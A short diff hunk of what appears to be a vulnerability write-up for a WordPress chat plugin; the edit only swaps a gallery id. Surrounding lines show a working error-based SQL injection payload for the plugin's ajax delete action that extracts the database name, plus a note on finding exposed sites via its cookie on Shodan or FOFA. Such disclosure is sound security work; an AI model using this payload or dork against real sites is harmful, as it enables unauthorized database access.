@@ -90,7 +90,7 @@ Proof of concept to get the current database name using an error based technique
 action=quick-chat-ajax-delete&to_delete_ids[]=666,(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,Hex(cast(database() as char)),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
 ```
 
-{% include gallery id="gallerypoc2" %}
+{% include gallery id="gallerypoc3" %}
 
 ## Dorks
 The pluging sets the cookie "quick_chat_alias" so it can be easely tracked searching for it on [shodan.io](https://www.shodan.io/) or [fofa.so](https://fofa.so)
